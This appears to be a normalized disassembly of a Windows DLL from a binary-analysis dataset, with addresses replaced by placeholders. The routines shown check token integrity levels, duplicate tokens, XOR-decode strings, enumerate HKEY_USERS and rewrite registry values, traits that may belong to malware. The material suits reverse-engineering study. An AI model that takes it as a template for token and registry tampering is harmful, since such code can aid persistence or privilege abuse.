mov [ ebp - 0x118 ] eax
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
cmp [ ebp - 0xbc ] ebx
je r-xdata
push [ ebp - 0xb0 ]
call [ FreeSid@IAT ]
mov [ ebp - 0xb0 ] ebx
retn
push [ ebp - 0xbc ]
call [ FreeSid@IAT ]
mov [ ebp - 0xbc ] ebx
sub_100071d7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
or [ ebp - 0x28 ] 0xffffffff
xor edi edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
push 0x18
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push edi
push edi
push 0x19
push [ ebp - 0x20 ]
mov esi [ GetTokenInformation@IAT ]
call esi
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
mov [ ebp - 0x2c ] eax
cmp eax 0x7a
jne r-xdata
mov [ ebp - 0x4 ] edi
call sub_100072d2
jmp r-xdata
push [ ebp - 0x24 ]
push edi
call [ LocalAlloc@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x24 ]
push ebx
push 0x19
push [ ebp - 0x20 ]
call esi
test eax eax
je r-xdata
push [ ebx ]
call [ GetSidSubAuthorityCount@IAT ]
mov al [ eax ]
dec al
movzx eax al
push eax
push [ ebx ]
call [ GetSidSubAuthority@IAT ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
cmp eax 0x1000
je r-xdata
cmp eax 0x2000
je r-xdata
cmp eax 0x3000
je r-xdata
cmp eax 0x4000
je r-xdata
or [ ebp - 0x28 ] 0xffffffff
jmp r-xdata
sub_10007315
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x8 ] ebx
push 0x1
pop esi
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push esi
push 0x8
call sub_1000745e
add esp 0xc
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x98 ]
mov [ ebp - 0xb0 ] eax
push 0x2
push 0x54
lea eax [ ebp - 0x98 ]
push eax
call [ InitializeAcl@IAT ]
push [ ebp + 0xc ]
push esi
push 0x2
lea eax [ ebp - 0x98 ]
push eax
call [ AddAccessAllowedAce@IAT ]
push esi
lea eax [ ebp - 0x44 ]
push eax
call [ InitializeSecurityDescriptor@IAT ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x27 ] 0x1
mov [ ebp - 0x26 ] bl
mov [ ebp - 0x25 ] bl
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x22 ] bl
mov [ ebp - 0x21 ] 0x1
mov [ ebp - 0x20 ] ebx
push ebx
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ SetSecurityDescriptorOwner@IAT ]
push ebx
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ SetSecurityDescriptorGroup@IAT ]
push ebx
lea eax [ ebp - 0x98 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
call [ SetSecurityDescriptorDacl@IAT ]
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0x30 ] 0x14
push [ ebp + 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xc0 ]
push eax
push esi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x44 ]
push eax
call [ AccessCheck@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_1000745e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] esi
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push [ ebp + 0x8 ]
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x3f0
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
cmp [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
pop eax
jmp r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0x2
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
call [ DuplicateTokenEx@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
mov [ ebp - 0x24 ] esi
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x1c ] esi
sub_1000753a
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp - 0x20 ]
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
push rw-data
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0xc ] 0xc
call [ CreateMutexW@IAT ]
leave
retn
sub_10007594
add esp 0xc
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x94 ] 0x94
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x63
pop eax
leave
retn
mov eax [ ebp - 0x84 ]
leave
retn
mov ecx [ ebp - 0x90 ]
mov [ eax ] ecx
sub_100075ce
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000d360
pop ecx
xor ecx ecx
test eax eax
jle r-xdata
pop esi
retn
mov dl [ esp + 0xc ]
xor [ ecx + esi ] dl
inc ecx
cmp ecx eax
jl r-xdata
sub_1000760a
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
call [ IsValidSid@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call [ GetSidIdentifierAuthority@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ GetSidSubAuthorityCount@IAT ]
movzx eax [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + 0x1c ]
cmp [ ecx ] eax
jae r-xdata
pop esi
leave
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ wsprintfA@IAT ]
push 0x1
push rw-data
push ebx
call edi
mov [ ebp + 0x10 ] eax
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
push 0x7a
mov [ ecx ] eax
call [ SetLastError@IAT ]
movzx ecx [ esi + 0x5 ]
push ecx
movzx ecx [ esi + 0x4 ]
push ecx
movzx ecx [ esi + 0x3 ]
push ecx
movzx ecx [ esi + 0x2 ]
push ecx
movzx ecx [ esi + 0x1 ]
movzx eax al
push ecx
push eax
push rw-data
push ebx
call [ lstrlenA@IAT ]
add eax ebx
push eax
call edi
add esp 0x20
cmp [ esi + 0x1 ] al
jne r-xdata
push 0x1
pop eax
pop edi
pop ebx
push esi
push [ ebp + 0x8 ]
call [ GetSidSubAuthority@IAT ]
push [ eax ]
mov eax [ ebp + 0x10 ]
add eax ebx
push rw-data
push eax
call edi
add [ ebp + 0x10 ] eax
add esp 0xc
inc esi
cmp esi [ ebp - 0x4 ]
jb r-xdata
movzx eax [ esi + 0x2 ]
movzx ecx [ esi + 0x3 ]
shl eax 0x8
add eax ecx
movzx ecx [ esi + 0x4 ]
shl eax 0x8
add eax ecx
movzx ecx [ esi + 0x5 ]
shl eax 0x8
add eax ecx
push eax
push rw-data
push ebx
call [ lstrlenA@IAT ]
add eax ebx
push eax
call edi
add esp 0xc
jmp r-xdata
add [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_1000771c
push ebp
mov ebp esp
sub esp 0x430
push ebx
push esi
push edi
xor ebx ebx
push 0x6
lea eax [ ebp - 0x8 ]
push ebx
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
call sub_1000d316
sub_10007754
add esp 0xc
lea eax [ ebp - 0x430 ]
push [ ebp + 0x8 ]
push eax
call [ lstrcpyA@IAT ]
mov edi [ _mbschr@IAT ]
lea eax [ ebp - 0x430 ]
push 0x2d
push eax
call edi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
inc eax
push 0x2d
push eax
call edi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc eax
push 0x2d
push eax
mov [ ebp + 0x8 ] eax
call edi
mov esi eax
pop ecx
cmp esi ebx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] bl
cmp [ eax ] 0x30
jne r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
push rw-data
push eax
call [ sscanf@IAT ]
mov al [ ebp + 0x8 ]
add esp 0xc
mov [ ebp - 0x3 ] al
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x5 ] bl
mov [ ebp - 0x6 ] bl
cmp [ eax + 0x1 ] 0x78
jne r-xdata
movzx eax [ ebp - 0x10 ]
cmp eax ebx
jle r-xdata
mov [ eax ] bl
inc eax
inc [ ebp - 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x8
jl r-xdata
lea ecx [ ebp - 0x3 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x5 ]
push ecx
lea ecx [ ebp - 0x6 ]
push ecx
lea ecx [ ebp - 0x7 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push rw-data
push eax
call [ sscanf@IAT ]
add esp 0x20
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0x10 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
test eax eax
jne r-xdata
lea edi [ ebp - 0x30 ]
mov [ ebp + 0x8 ] eax
push 0x2d
push eax
call edi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ esi ] 0x2d
mov eax esi
inc esi
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] ebx
push edi
push rw-data
push esi
call [ sscanf@IAT ]
add esp 0xc
push esi
call [ lstrlenA@IAT ]
add edi 0x4
dec [ ebp + 0x8 ]
lea esi [ esi + eax + 0x1 ]
jne r-xdata
sub_1000788e
push ebp
mov ebp esp
sub esp 0x14c
push ebx
push esi
lea eax [ ebp - 0x24 ]
push edi
xor ebx ebx
push eax
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] 0x12
mov [ ebp - 0x23 ] 0x78
mov [ ebp - 0x22 ] 0x79
mov [ ebp - 0x21 ] 0x7a
mov [ ebp - 0x20 ] 0x7d
mov [ ebp - 0x1f ] 0x69
mov [ ebp - 0x1e ] 0x70
mov [ ebp - 0x1d ] 0x68
mov [ ebp - 0x1c ] bl
call sub_100075fc
mov [ esp ] rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x34 ] edi
je r-xdata
mov [ ebp - 0x4 ] 0x4dd
call [ GetVersion@IAT ]
cmp eax 0x80000000
jae r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] ebx
mov [ rw-data ] eax
je r-xdata
push ebx
push ebx
mov edi [ RegEnumKeyExA@IAT ]
push ebx
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x14c ]
push eax
push ebx
push 0x80000003
mov [ ebp - 0x8 ] 0x104
mov [ ebp - 0x14 ] ebx
call edi
cmp eax 0x103
je r-xdata
cmp [ ebp - 0x28 ] 0x1
jne r-xdata
push edi
call [ FreeLibrary@IAT ]
mov [ ebp - 0x34 ] ebx
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x28 ] 0x1
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x14c ]
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
push ebx
call [ rw-data ]
test eax eax
je r-xdata
cmp eax ebx
je r-xdata
push [ ebp - 0x4 ]
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ SetLastError@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x34 ] ebx
je r-xdata
lea eax [ ebp - 0x14c ]
push eax
call sub_1000771c
lea eax [ ebp - 0x14c ]
push eax
call [ lstrlenA@IAT ]
cmp eax 0x14
jle r-xdata
cmp [ ebp - 0x44 ] ebx
mov [ ebp - 0x14 ] ebx
jbe r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
push [ ebp - 0x34 ]
call [ FreeLibrary@IAT ]
inc [ ebp - 0x14 ]
push ebx
push ebx
push ebx
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x14c ]
push eax
mov [ ebp - 0x14c ] bl
push [ ebp - 0x14 ]
mov [ ebp - 0x8 ] 0x104
push 0x80000003
call edi
cmp eax 0x103
je r-xdata
push [ ebp - 0x18 ]
call [ rw-data ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2c ] ebx
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x7a
je r-xdata
inc [ ebp - 0x14 ]
add [ ebp - 0x2c ] 0xc
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x44 ]
jb r-xdata
lea ecx [ ebp - 0x40 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push 0x5
push [ eax ]
push ebx
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
add eax ecx
cmp [ eax + 0x8 ] ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ LookupAccountNameA@IAT ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push ebx
push eax
push ebx
mov [ ebp - 0x30 ] ebx
push [ ebp - 0x8 ]
mov [ ebp - 0x38 ] ebx
push ebx
call edi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ rw-data ]
mov [ ebp - 0x8 ] ebx
call [ GetLastError@IAT ]
push 0x7a
pop esi
cmp eax esi
jne r-xdata
push [ ebp - 0x30 ]
call sub_1000d4d0
push [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
call sub_1000d4d0
cmp [ ebp - 0xc ] ebx
pop ecx
pop ecx
mov [ ebp - 0x3c ] eax
je r-xdata
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push ebx
call edi
test eax eax
je r-xdata
push [ ebp - 0xc ]
call sub_1000d4ca
push [ ebp - 0x3c ]
call sub_1000d4ca
pop ecx
pop ecx
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
push eax
push ebx
push [ ebp - 0xc ]
call sub_1000760a
add esp 0xc
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax esi
jne r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x40 ]
cmp [ ecx ] eax
jae r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ edi ] eax
jae r-xdata
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ lstrcpyA@IAT ]
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call sub_1000760a
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x10 ]
mov [ edi ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x40 ]
mov [ eax ] ecx
sub_10007cdb
push ebp
mov ebp esp
sub esp 0x414
mov dl [ rw-data ]
push ebx
push esi
push edi
push 0x7f
xor eax eax
pop ecx
lea edi [ ebp - 0x413 ]
mov [ ebp - 0x414 ] dl
push 0x7f
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x213 ]
mov [ ebp - 0x214 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push ebx
mov edi [ RegEnumValueA@IAT ]
push eax
lea eax [ ebp - 0x414 ]
push eax
push ebx
push [ ebp + 0x8 ]
mov esi 0x200
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] ebx
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x414 ]
push [ ebp - 0x10 ]
push ebx
push eax
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x414 ]
mov [ ebp - 0x8 ] esi
push eax
mov [ ebp - 0x414 ] bl
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x214 ] bl
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov [ ebp - 0x14 ] 0x1
sub_10007dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
xor edi edi
push eax
push 0x1
mov esi rw-data
push edi
push esi
push [ ebp + 0x8 ]
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
leave
retn
lea eax [ ebp + 0x8 ]
push edi
push eax
push edi
push 0x2001f
push edi
push rw-data
push edi
push esi
push [ ebp + 0xc ]
call [ RegCreateKeyExA@IAT ]
mov esi [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call esi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_10007cdb
pop ecx
mov ebx eax
pop ecx
push [ ebp + 0x8 ]
call esi
mov [ ebp + 0x8 ] edi
sub_10007e2e
push ebp
mov ebp esp
sub esp 0x20c
push ebx
push esi
push edi
xor edi edi
push 0xff
lea eax [ ebp - 0x10c ]
push edi
push eax
mov [ ebp - 0xc ] edi
call sub_1000d316
sub_10007edf
add esp 0xc
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call ebx
lea eax [ ebp + 0x8 ]
xor ebx ebx
push eax
push 0x20019
lea eax [ ebp - 0x20c ]
push ebx
push eax
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call edi
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x8 ]
call edi
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10007cdb
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10007dc0
add esp 0x10
push [ ebp + 0x8 ]
call edi
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] 0x1
sub_10007f49
push ebp
mov ebp esp
sub esp 0x11c
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x11c ]
push ebx
push eax
mov [ ebp - 0xc ] ebx
call sub_1000d316
sub_10007f6c
add esp 0xc
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
mov edi [ RegOpenKeyExA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x2001f
lea eax [ ebp - 0x11c ]
push ebx
push eax
push 0x80000003
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x8 ]
push eax
push 0x2001f
lea eax [ ebp - 0x11c ]
push ebx
push eax
push 0x80000003
call edi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x10 ]
mov edi [ RegQueryValueExA@IAT ]
push eax
push ebx
push ebx
push ebx
push rw-data
mov [ ebp - 0x10 ] ebx
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x8 ] ebx
push [ ebp - 0x10 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x1c ] esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
push ebx
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
push esi
call [ LocalFree@IAT ]
mov eax [ esi + 0x8 ]
add esi 0x8
mov edi [ RegSetValueExA@IAT ]
add esi 0x4
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] ebx
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
mov [ ebp - 0x14 ] ebx
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
add esi [ ebp - 0x18 ]
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
shr eax 0x1
and eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
test [ ebp - 0xc ] 0x4
je r-xdata
add esi [ ebp - 0x18 ]
mov eax [ esi ]
cmp eax ebx
je r-xdata
add esi 0x4
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push 0x3
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
mov esi [ ebp - 0x1c ]
mov [ ebp - 0xc ] 0x1
sub_1000815d
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x108 ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000d316
sub_10008180
add esp 0xc
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
mov edi rw-data
lea eax [ ebp - 0x108 ]
push edi
push eax
call esi
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call esi
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x8 ]
push eax
push 0x2001f
lea eax [ ebp - 0x108 ]
push ebx
push eax
push 0x80000003
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
push ebx
push ebx
push rw-data
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x4 ] 0x1
sub_1000821e
cmp [ rw-data ] 0x1
je r-xdata
retn
push rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075ee
pop ecx
mov [ rw-data ] 0x1
sub_100082ce
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ ebp + 0xc ]
push esi
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
and [ eax ] 0x0
cmp esi 0xa
jae r-xdata
push 0x57
jmp r-xdata
push ebx
push edi
push 0x14
lea eax [ ebp - 0x14 ]
pop edi
push edi
push 0x0
push eax
call sub_1000d316
push 0xffffffe6
pop eax
jmp r-xdata
pop esi
leave
retn
sub_10008307
add esp 0xc
mov [ ebp - 0x14 ] esi
call [ GetVersion@IAT ]
mov ebx eax
mov [ ebp + 0x8 ] 0xffffffbe
movzx eax bl
sub eax 0x4
je r-xdata
call sub_1000c680
test al al
je r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_1000840e
mov [ ebp + 0x8 ] 0xffffffe2
jmp r-xdata
mov esi 0x9c
lea eax [ ebp - 0xb0 ]
push esi
push 0x0
push eax
call sub_1000d316
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
pop esi
leave
retn
push edi
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_100089de
jmp r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push esi
call sub_1000d31c
call sub_100096ce
add esp 0xc
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
sub_10008355
add esp 0xc
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0xb0 ] esi
push eax
call [ GetVersionExA@IAT ]
xor eax eax
mov al bh
movzx eax al
sub eax 0x0
je r-xdata
